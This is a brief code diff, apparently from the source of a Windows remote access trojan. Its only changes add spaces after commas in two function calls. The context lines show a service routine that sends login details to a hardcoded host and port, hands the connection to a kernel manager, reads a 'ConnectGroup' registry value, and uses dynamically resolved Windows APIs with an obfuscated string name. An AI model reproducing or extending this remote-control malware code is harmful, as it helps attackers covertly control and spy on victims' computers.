@@ -651,7 +651,7 @@ void my_ServiceMain()
 		// 登录
 		DWORD dwExitCode = SOCKET_ERROR;
 
-		sendLoginInfo(ServiceName, &socketClient, pGetTickCount() - dwTickCount,m_OnlineInfo.szMark);
+		sendLoginInfo(ServiceName, &socketClient, pGetTickCount() - dwTickCount, m_OnlineInfo.szMark);
 		//CKernelManager	manager(&socketClient,ServiceName, g_dwServiceType, strKillEvent, lpConnecte[nConnect], dwPort[nConnect]);
 		CKernelManager	manager(&socketClient,ServiceName, g_dwServiceType, strKillEvent, HOST, PORT);
 		socketClient.setManagerCallBack(&manager);
@@ -1091,7 +1091,7 @@ int APIENTRY WinMain( __in HINSTANCE hInstance,
 	{
 		Gyfunction->my_sprintf(ServiceName,"%s",m_ServiceInfo.ReleacsName);  //赋值服务名称
 	                                                                         //检查是否有分组信息，并写入分组信息
-		pwsprintfA(strSubKey0, JYvni08,ServiceName);	
+		pwsprintfA(strSubKey0, JYvni08, ServiceName);	
 	    ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey0, "ConnectGroup", REG_SZ, 
 			(char *)lpBuffer, NULL, sizeof(lpBuffer), 0);
 
